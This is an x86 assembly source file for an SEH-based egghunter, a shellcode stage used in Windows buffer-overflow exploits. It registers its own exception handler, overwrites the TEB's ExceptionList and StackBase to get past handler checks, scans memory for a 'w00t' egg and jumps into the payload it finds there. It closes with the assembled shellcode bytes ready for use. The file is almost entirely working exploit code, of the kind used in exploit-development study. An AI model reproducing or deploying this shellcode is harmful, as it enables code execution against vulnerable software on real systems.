global _start:

_start:
    jmp .addr                      ; jmp to call .seh

    .seh:
        mov eax, 0x74303077        ; $eax = "w00t"

        pop ecx                    ; $ecx = handler
        push ecx                   ; push handler
        push 0xffffffff            ; push nseh

        xor ebx, ebx               ; $ebx = 0x0
        mov [fs:ebx], esp          ; overwrite ExceptionList in TEB

        sub ecx, 0x4               ; sub 0x4 (SEH Handler > StackBase)
        add ebx, 0x4               ; add 0x4 to point to StackBase
        mov [fs:ebx], ecx          ; overwrite StackBase to pass check

    .find:
        push 0x2                   ; push 0x2
        pop ecx                    ; $ecx = counter

        mov edi, ebx               ; $edi = address
        repz scasd                 ; cmp eax, [edi]

        jnz .loop                  ; if zf == 0 -> loop

        jmp edi                    ; if zf == 1 -> exec

    .page:
        or bx, 0xfff               ; get last address in page

    .loop:
        inc ebx                    ; increase memory counter
        jmp .find                  ; loop to cmp

    .addr:
        call .seh                  ; call .seh to set handler

        push 0xc                   ; push 0xc
        pop ecx                    ; $ecx = 0xc
        mov eax, [esp + ecx]       ; $eax = structure for exception

        mov cl, 0xb8               ; $ecx = 0xb8 act as offset to eip
        add dword [eax + ecx], 0x6 ; add 0x6 to eip = .page

        pop eax                    ; $eax = return value
        add esp, 0x10              ; clear stack
        push eax                   ; push return value

        xor eax, eax               ; $eax = 0x0
        ret                        ; return to .page

; egg = b"w00t" * 2
; egghunter = b"\xeb\x2a\xb8\x77\x30\x30\x74\x59\x51\x6a\xff\x31\xdb\x64\x89\x23\x83\xe9\x04\x83\xc3\x04\x64\x89\x0b\x6a\x02\x59\x89\xdf\xf3\xaf\x75\x07\xff\xe7\x66\x81\xcb\xff\x0f\x43\xeb\xed\xe8\xd1\xff\xff\xff\x6a\x0c\x59\x8b\x04\x0c\xb1\xb8\x83\x04\x08\x06\x58\x83\xc4\x10\x50\x31\xc0\xc3"
